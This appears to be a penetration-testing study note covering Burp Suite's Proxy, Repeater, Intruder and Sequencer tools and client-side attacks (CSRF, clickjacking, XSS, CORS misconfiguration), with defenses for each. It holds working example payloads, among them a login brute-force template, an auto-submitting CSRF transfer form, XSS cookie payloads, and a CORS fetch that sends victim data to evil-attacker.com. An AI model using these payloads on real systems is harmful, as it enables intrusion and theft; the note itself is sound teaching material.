### Burp Suite Deep Dive and Client-Side Attacks

--> ⚠️ LEGAL / ETHICAL REMINDER: Everything below assumes you're testing an application you own, a deliberately vulnerable lab (DVWA, OWASP Juice Shop, PortSwigger Web Security Academy, HackTheBox/TryHackMe boxes), or a target explicitly and currently in scope under a signed engagement/bug bounty program. Intercepting or modifying traffic to a site without authorization — even "just to look" — is unauthorized access under laws like the CFAA (US) or Computer Misuse Act (UK). Scope documents and rules of engagement always win over curiosity.

--> This note assumes you already know Burp's absolute basics (it's an intercepting proxy). The goal here is to go deep on the four tools you'll actually live in day-to-day — Proxy, Repeater, Intruder, Sequencer — and then cover the client-side attack classes you use them to find.

## Burp Suite Architecture

--> Burp sits as a man-in-the-middle between your browser and the target web server. Your browser is configured to send all traffic through Burp's local proxy listener (`127.0.0.1:8080` by default) instead of directly to the internet.

--> Setup, step by step:
1. Set your browser's proxy settings (or use FoxyProxy extension for one-click toggling) to `127.0.0.1:8080`.
2. Visit `http://burp` (or `http://burpsuite`) in that proxy-configured browser — Burp serves its own CA certificate download page.
3. Install the downloaded `cacert.der` into your browser/OS trust store as a trusted Certificate Authority.
4. Without step 3, every HTTPS site will throw a certificate warning — Burp has to dynamically generate a fake per-site certificate signed by ITS OWN CA on the fly to decrypt and re-encrypt TLS traffic, and your browser only accepts that fake cert if it already trusts Burp's CA.

--> Why this matters conceptually: this is literally a textbook MITM attack pattern, except you're doing it to yourself deliberately so you can read/modify your own encrypted traffic before it leaves your machine. Understanding this is also what lets you understand real-world SSL-stripping/rogue-AP attacks (note 02/03 territory) and why certificate pinning (covered in note 15) exists specifically to defeat this trick on mobile apps.

## Proxy — Intercept and HTTP History

--> The Proxy tab is Burp's core: every request/response that passes through the listener shows up here.

==> Intercept tab
--> When "Intercept is on", every outgoing request pauses in Burp before reaching the server, letting you edit method, headers, cookies, or body live before forwarding it (`Forward`) or killing it (`Drop`).
--> Use case: you want to change a single request mid-flight right as you trigger it in the browser — e.g. flipping a `role=user` parameter to `role=admin` in a signup POST before it hits the server, to test if server-side validation catches it.
--> In practice, most testers leave Intercept OFF most of the time (it's tedious to click Forward on every single asset request) and instead work passively off the HTTP History.

==> HTTP History (Proxy > HTTP history sub-tab)
--> A running, filterable log of every request/response that has passed through the proxy, whether or not Intercept was on. This is your primary recon tool for mapping an application's attack surface.
--> Right-click any entry to `Send to Repeater`, `Send to Intruder`, or `Send to Sequencer` — this is how the tools below actually receive their input; you rarely type raw requests from scratch.
--> Filter bar lets you hide static content (`.js`, `.css`, images) and show only in-scope hosts — critical once history grows to thousands of entries during a real test.

--> Use Proxy when: you're exploring an app for the first time, mapping endpoints, or need to catch/modify a request at the exact moment it fires (e.g. a one-time CSRF token, a race-condition window).

## Repeater — Manual Request Crafting

--> Repeater takes a single captured request and lets you re-send it as many times as you want, editing it freely between sends, with the response shown side by side.

--> Typical workflow:
1. Send an interesting request from Proxy history (e.g. a password-reset POST) to Repeater (`Ctrl+R` or right-click).
2. Modify a parameter — change an email address, strip a header, alter a JSON field, remove an Authorization token entirely.
3. Click `Send` and compare the new response against the original: status code, body content, response time, headers.
4. Repeat with small variations to isolate exactly which input controls the behavior — this is manual, hypothesis-driven testing, the opposite of Intruder's brute-force approach.

--> Concrete example — testing an IDOR/BOLA (see note 15 for the mobile/API angle too):
```http
GET /api/orders/1053 HTTP/1.1
Host: shop.example.com
Cookie: session=abc123...
```
--> In Repeater, just change `1053` to `1054` and hit Send. If you get another user's order data back with a `200 OK` and your own session cookie, the object-level authorization check is missing — you just confirmed a real vulnerability with a two-second edit, no scripting needed.

--> Use Repeater when: you have a specific hypothesis about ONE request and want tight, deliberate control over each field — this is where 80% of real manual bug-hunting time goes.

## Intruder — Automated Payload Fuzzing

--> Intruder takes a single request as a template, marks one or more positions in it as variable, and fires it repeatedly with different payload values substituted into those positions, capturing every response for comparison (status code, length, word count, time).

==> Payload positions
--> Any part of the request — a parameter value, a header, a cookie, even a URL path segment — can be wrapped in `§...§` markers to mark it as a substitution point. Burp auto-guesses likely positions when you send a request to Intruder, but you should manually verify/clean these up.

==> The four attack types
1. **Sniper** — one payload set, one position at a time. If there are 3 marked positions, it cycles through the payload list against position 1 (holding others at their original value), then position 2, then position 3. Total requests = payloads × positions. Best for: fuzzing a single unknown parameter for injection points, or testing several parameters independently for the same class of bug (e.g. checking each of 3 form fields for XSS one at a time).
2. **Battering ram** — one payload set, but the SAME payload value is inserted into ALL marked positions simultaneously on each request. Best for: cases where a value must match in two places to be valid, e.g. a password field and a password-confirmation field both need the same test string, or a value appears in both a URL param and a header that must agree.
3. **Pitchfork** — multiple payload sets (one list per position), iterated in lockstep — request 1 uses item 1 from each list, request 2 uses item 2 from each list, etc. Lists must be the same length. Best for: testing correlated pairs, e.g. a list of usernames and a list of their known-but-unconfirmed emails, testing username[i] + email[i] together.
4. **Cluster bomb** — multiple payload sets, but EVERY combination of every list is tried (a full Cartesian product). Best for: credential brute-forcing where you have a username list and a password list and want to try every username against every password — this is the classic login brute-force configuration. Total requests = product of all list lengths, so it scales badly fast (100 users × 100 passwords = 10,000 requests).

--> Practical example — brute-forcing a login form with Cluster Bomb:
```http
POST /login HTTP/1.1
Host: target.local
Content-Type: application/x-www-form-urlencoded

username=§admin§&password=§password§
```
--> Load a username wordlist into position 1's payload set and a password wordlist (e.g. `rockyou.txt` or SecLists) into position 2's. After the attack runs, sort results by response length or status code — the one successful login almost always has a distinctly different response length/time/redirect than the hundreds of failed attempts, letting you spot it instantly in the results grid without reading every response.

--> Use Intruder when: you need to try MANY values against the same request shape — brute-forcing, fuzzing for injection, enumerating valid usernames via response differences (a "Username enumeration" attack: compare "invalid username" vs "invalid password" error text/timing).

--> Community edition throttles Intruder's speed heavily; Pro removes this. Worth knowing before you assume a lab exercise is "supposed to" be slow.

## Sequencer — Session Token Randomness Analysis

--> Sequencer captures a large sample of tokens (session cookies, CSRF tokens, password-reset tokens, API keys) — either by feeding it a live request that generates a fresh token each time, or by pasting in a list you already collected — and runs statistical randomness tests (character-level and bit-level analysis, FIPS 140-2 monobit/poker/runs tests, entropy estimation) against the sample.

--> Why this matters: if session tokens are predictable (e.g. sequential integers, timestamp-based, or a weak PRNG seeded predictably), an attacker who can observe a handful of legitimate tokens can PREDICT a future or another user's valid session token without ever stealing a cookie — full account takeover through pure guessing.
--> Output includes an overall entropy estimate in bits — a healthy session token should show entropy close to its theoretical maximum (a 128-bit random token should show close to 128 bits of measured entropy; anything noticeably lower signals a weak generator).

--> Use Sequencer when: an app issues session IDs, "remember me" tokens, or password-reset links that LOOK like they might follow a pattern (sequential-looking, suspiciously short, or reused-looking across accounts) — capture 100+ samples and let Sequencer tell you objectively whether your suspicion holds up, rather than eyeballing a handful of tokens.

---

## Client-Side Attacks

--> Everything above is tooling. The rest of this note covers what you're actually hunting for in the browser/DOM layer — bugs that exploit trust relationships between sites, browsers, and users rather than the server's backend logic directly.

## Cross-Site Request Forgery (CSRF)

--> CSRF tricks a victim's browser into submitting a request to a site the victim is already authenticated to, using the victim's own session cookie, without the victim's knowledge or consent. The browser attaches cookies automatically to any request to that domain, regardless of which page/origin initiated the request — that's the trust CSRF abuses.

--> Worked example — a bank's fund-transfer form with NO CSRF token:
```http
POST /transfer HTTP/1.1
Host: bank.example.com
Cookie: session=victim_session_abc
Content-Type: application/x-www-form-urlencoded

to_account=1234&amount=5000
```
--> An attacker hosts this auto-submitting HTML on a completely different site and lures the logged-in victim to visit it:
```html
<form action="https://bank.example.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('csrf').submit();</script>
```
--> The victim's browser sends this request WITH their `session` cookie attached automatically (cookies are per-domain, not per-origin-of-the-page-that-triggered-them), so the bank sees what looks like a perfectly legitimate authenticated transfer request.

--> Standard defense: anti-CSRF tokens — a random, unpredictable, per-session (or per-request) value embedded as a hidden form field that must be echoed back and validated server-side. The attacker's cross-origin form can't read this token (same-origin policy blocks reading the page's DOM/response from another origin), so it can't include a valid one.
```html
<input type="hidden" name="csrf_token" value="a1b2c3d4e5...">
```
--> Bypass scenario to test for during an assessment: does the app actually VALIDATE the token server-side, or just check that the field is present? Try submitting the request with the token field completely removed, or with an old/expired token reused, or with another user's valid token swapped in — a shocking number of real implementations only check "is `csrf_token` present and non-empty" rather than "does it match the value tied to this specific session."
--> Also check the `SameSite` cookie attribute — `SameSite=Strict` or `SameSite=Lax` on the session cookie blocks the browser from attaching it to most cross-site requests in the first place, providing defense-in-depth even if the token check has a bug.

## Clickjacking

--> Clickjacking loads the TARGET site inside an invisible/transparent `<iframe>` on the ATTACKER's page, then overlays deceptive content (a fake "Claim your prize" button) precisely positioned over a real, sensitive button on the hidden iframe underneath. The victim thinks they're clicking the fake button but their click actually lands on the real target site's button — while still logged in, since the iframe carries their real session.

--> Minimal concept PoC:
```html
<style>
  iframe { position:absolute; top:0; left:0; width:500px; height:500px; opacity:0.0001; }
  .decoy { position:absolute; top:250px; left:100px; z-index:-1; }
</style>
<div class="decoy">Click here to win a prize!</div>
<iframe src="https://victim-site.com/delete-account"></iframe>
```
--> The iframe is rendered nearly fully transparent and positioned so its real "Delete Account" or "Enable 2FA transfer" button sits exactly under the decoy text the victim intends to click.

--> Defenses:
```http
X-Frame-Options: DENY
```
--> or more flexibly, the modern replacement:
```http
Content-Security-Policy: frame-ancestors 'none'
```
--> `frame-ancestors 'self'` allows framing only by pages on the same origin (useful for legitimate same-site embedding); `DENY`/`'none'` blocks framing entirely — set this header on any page performing a sensitive state-changing action.
--> Testing approach: try loading the target page inside a simple local `<iframe>` test page — if it renders instead of refusing/breaking, the header is missing or misconfigured.

## XSS Revisited — Reflected vs Stored vs DOM-based, at the Sink Level

--> Note 04 introduced the three XSS types by WHERE the payload comes from and how it's delivered. Here's the distinction that actually matters for finding them: WHERE the untrusted data ends up — the "sink" — and whether the server ever saw the payload at all.

--> **Reflected XSS**: payload travels in the request (URL param, form field), server includes it unescaped in the IMMEDIATE response, no persistence. Server-side code touches it.
```text
https://example.com/search?q=<script>alert(document.domain)</script>
```

--> **Stored XSS**: payload is saved server-side (database, file, log) and rendered to potentially many later visitors on a totally separate request. Server-side code touches it, but the "trigger" request and the "vulnerable" request are different.
```text
Comment field: <img src=x onerror=alert(document.cookie)>
```
--> This gets stored in a `comments` table and pops for every single visitor who later loads that page — far higher impact, since no social engineering / crafted link is needed.

--> **DOM-based XSS**: the payload NEVER touches the server at all — it flows entirely through client-side JavaScript, from a "source" (attacker-controllable input like `location.hash`, `location.search`, `document.referrer`, `postMessage` data) into a dangerous "sink" (a JS API that writes raw HTML/executes code) purely in the browser.
```javascript
// Vulnerable client-side code
var name = location.hash.substring(1);   // source: URL fragment, never sent to server
document.getElementById('welcome').innerHTML = "Hello " + name;   // sink: innerHTML
```
```text
https://example.com/page#<img src=x onerror=alert(1)>
```
--> Because the fragment (`#...`) is never transmitted to the server at all, this bug is invisible to server-side logs, WAFs, or server-side input filtering — you can only find it by reading/testing client-side JS execution paths, which is exactly why Burp's DOM Invader (built into the browser-embedded Chromium in Burp Pro) exists: it instruments common sinks (`innerHTML`, `eval`, `document.write`, `location.assign`, jQuery's `.html()`) and flags when attacker-controllable data reaches one.
--> Common dangerous sinks to grep for in JS source during a review: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `insertAdjacentHTML()`, jQuery `.html()`/`$()` with untrusted strings, and Angular's `bypassSecurityTrustHtml`.

--> Fix, all three types: contextual output encoding (HTML-entity-encode for HTML body context, JS-string-escape for inline script context, URL-encode for URL context — the encoding MUST match where the data lands) plus a strong `Content-Security-Policy` as defense-in-depth, plus never using raw `innerHTML`/`eval` on any data path that touches user input — use `textContent` or a templating engine that auto-escapes by default (React JSX, Vue templates) instead.

## CORS Misconfiguration

--> Cross-Origin Resource Sharing (CORS) is the browser mechanism that lets a server explicitly opt IN to letting JavaScript running on a DIFFERENT origin read its responses (normally blocked by the Same-Origin Policy). The server sets response headers to grant this exception.

--> The dangerous misconfiguration: reflecting ANY requesting origin back combined with allowing credentials.
```http
Access-Control-Allow-Origin: https://evil-attacker.com
Access-Control-Allow-Credentials: true
```
--> `Access-Control-Allow-Credentials: true` tells the browser it's fine to send the request WITH cookies attached AND let the requesting page read the response. If `Access-Control-Allow-Origin` is dynamically set to reflect whatever `Origin` header the browser sent (a common lazy implementation: `Access-Control-Allow-Origin: <whatever Origin the request came from>`), then literally any website on the internet can make an authenticated, credentialed cross-origin request to the victim API from a logged-in user's browser and read the JSON response back — full session-authenticated data exfiltration, no XSS required.

--> Worked example: attacker hosts this on `evil-attacker.com`, victim (logged into `api.example.com` in another tab) visits it:
```javascript
fetch('https://api.example.com/user/profile', { credentials: 'include' })
  .then(r => r.json())
  .then(data => fetch('https://evil-attacker.com/steal?data=' + JSON.stringify(data)));
```
--> If the API's CORS policy reflects any origin and allows credentials, this silently succeeds — the victim's cookies get attached to the `fetch`, the browser lets `evil-attacker.com`'s JS read the JSON response because the server said it was allowed to, and the attacker now has the victim's private profile data.

--> Note: `Access-Control-Allow-Origin: *` (a literal wildcard) CANNOT be combined with `Access-Control-Allow-Credentials: true` — browsers explicitly reject that combination. The actual exploitable bug is almost always the DYNAMIC-REFLECTION variant above, or a poorly written regex/allowlist check (e.g. checking only `.endswith("example.com")`, which also matches `evil-example.com`).

--> Testing approach: send a request with `Origin: https://evil-attacker-test.com` (or a null origin, or a subdomain trick like `example.com.evil.com`) and check whether the response's `Access-Control-Allow-Origin` reflects it back verbatim, and whether `Access-Control-Allow-Credentials: true` is also present — that combination on any endpoint returning sensitive data is a reportable finding.
--> Fix: maintain a strict server-side allowlist of exact trusted origins, never regex/substring-match, and only set `Allow-Credentials: true` for origins that genuinely need authenticated cross-origin access.
